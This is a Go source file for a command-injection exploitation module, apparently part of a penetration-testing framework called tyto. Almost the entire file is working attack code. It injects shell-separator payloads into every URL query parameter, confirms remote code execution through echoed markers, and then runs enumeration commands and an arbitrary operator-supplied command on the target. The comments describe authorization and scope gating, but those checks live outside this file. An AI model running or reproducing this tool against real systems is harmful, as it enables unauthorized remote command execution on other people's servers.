// Package cmdexec is an EXPLOITATION tool: it confirms and demonstrates OS
// command injection by actually executing commands on the target and capturing
// their output (proof of RCE). It is exploit-category / RiskHigh, so tyto's
// Scope Guard only lets it run when the target is in scope AND the engagement
// carries a verified authorization grant for high-risk actions. Demonstrating
// impact is the point of an authorized pentest.
package cmdexec

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/dukotah/tyto/internal/action"
	"github.com/dukotah/tyto/internal/state"
)

type Tool struct{ http *http.Client }

func New() *Tool { return &Tool{http: &http.Client{Timeout: 10 * time.Second}} }

func (t *Tool) Name() string              { return "cmdexec" }
func (t *Tool) Category() action.Category { return action.CategoryExploit }
func (t *Tool) MaxRisk() action.RiskLevel { return action.RiskHigh }

const (
	markStart = "TYTOxRCExSTART"
	markEnd   = "TYTOxRCExEND"
	maxBody   = 256 << 10
)

// sepList covers the common shell command separators across sh and cmd.exe so
// the same tool works whether the target is unix- or windows-backed.
var sepList = []string{";", "&", "|", "&&", "\n"}

// reconCmds are read-only post-exploitation enumeration commands; "whoami" and
// "hostname" work on both unix and Windows, the rest are best-effort.
var reconCmds = []string{"whoami", "hostname", "id", "uname -a"}

var markRe = regexp.MustCompile("(?s)" + markStart + "(.*?)" + markEnd)

func (t *Tool) Execute(ctx context.Context, a action.Action) (action.Result, error) {
	res := action.Result{ActionID: a.ID, Tool: t.Name(), StartedAt: time.Now().UTC()}
	base, err := url.Parse(normalizeURL(a.Target))
	if err != nil {
		res.Err = err.Error()
		res.FinishedAt = time.Now().UTC()
		return res, err
	}
	q := base.Query()
	if len(q) == 0 {
		res.Findings = append(res.Findings, state.Finding{
			ID: "RCE-" + a.ID, Title: "No query parameters to exploit", Severity: state.SeverityInfo,
			Target: base.String(), Tool: t.Name(), Validated: true,
		})
		res.Success = true
		res.Output = base.String() + ": no parameters"
		res.FinishedAt = time.Now().UTC()
		return res, nil
	}

	names := make([]string, 0, len(q))
	for n := range q {
		names = append(names, n)
	}
	sort.Strings(names)

	// An operator may direct a specific command via params["command"].
	opCmd := strings.TrimSpace(a.Params["command"])

	hits := 0
	for _, name := range names {
		if ctx.Err() != nil {
			res.Err = ctx.Err().Error()
			res.FinishedAt = time.Now().UTC()
			return res, ctx.Err()
		}
		for _, sep := range sepList {
			if _, ok := t.runCmd(ctx, base, name, sep, "whoami"); !ok {
				continue
			}
			// RCE confirmed on this parameter — enumerate with a few more commands.
			cmds := reconCmds
			if opCmd != "" {
				cmds = append([]string{opCmd}, reconCmds...)
			}
			var b strings.Builder
			for _, c := range cmds {
				if o, ok := t.runCmd(ctx, base, name, sep, c); ok && o != "" {
					fmt.Fprintf(&b, "$ %s\n%s\n", c, o)
				}
			}
			hits++
			res.Findings = append(res.Findings, state.Finding{
				ID:          fmt.Sprintf("RCE-%s-%d", a.ID, hits),
				Title:       "Remote command execution via parameter " + name,
				Severity:    state.SeverityCritical,
				Target:      base.String(),
				Description: "injected OS commands executed on the target; captured output proves RCE",
				Evidence:    truncate(b.String(), 1500),
				Tool:        t.Name(),
				Validated:   true,
				CVSS:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
			})
			break // move to the next parameter
		}
	}

	if hits == 0 {
		res.Findings = append(res.Findings, state.Finding{
			ID: "RCE-" + a.ID, Title: "No command execution confirmed", Severity: state.SeverityInfo,
			Target: base.String(), Tool: t.Name(), Validated: true,
		})
	}
	res.Success = true
	res.Output = fmt.Sprintf("%s: %d parameter(s) with RCE", base.String(), hits)
	res.FinishedAt = time.Now().UTC()
	return res, nil
}

// runCmd injects a marker-wrapped command via one separator and returns the
// command's captured stdout (the text the shell printed between the markers),
// or ok=false if no execution was observed.
func (t *Tool) runCmd(ctx context.Context, base *url.URL, name, sep, cmd string) (string, bool) {
	payload := "x" + sep + "echo " + markStart + sep + cmd + sep + "echo " + markEnd
	body, err := t.inject(ctx, base, name, payload)
	if err != nil {
		return "", false
	}
	// Several marker pairs may appear: the reflected literal payload (its content
	// still contains the word "echo") and the real command output (which does
	// not). Take the first match that is genuine command output.
	for _, m := range markRe.FindAllStringSubmatch(body, -1) {
		if strings.Contains(m[1], "echo") {
			continue // reflected payload, not executed output
		}
		if g := strings.TrimSpace(m[1]); g != "" {
			return g, true
		}
	}
	return "", false
}

func (t *Tool) inject(ctx context.Context, base *url.URL, name, payload string) (string, error) {
	u := *base
	q := u.Query()
	q.Set(name, payload)
	u.RawQuery = q.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "tyto-cmdexec")
	resp, err := t.http.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	return string(body), nil
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n] + "…"
	}
	return s
}

func normalizeURL(target string) string {
	if strings.Contains(target, "://") {
		return target
	}
	if strings.HasSuffix(target, ":443") || strings.HasSuffix(target, ":8443") {
		return "https://" + target
	}
	return "http://" + target
}

// WrapTransport implements tool.TransportWrapper: it lets the engine layer a
// RoundTripper (engagement traffic marker, evidence capture) under this tool's
// HTTP client without the tool knowing about it.
func (t *Tool) WrapTransport(wrap func(http.RoundTripper) http.RoundTripper) {
	t.http.Transport = wrap(t.http.Transport)
}
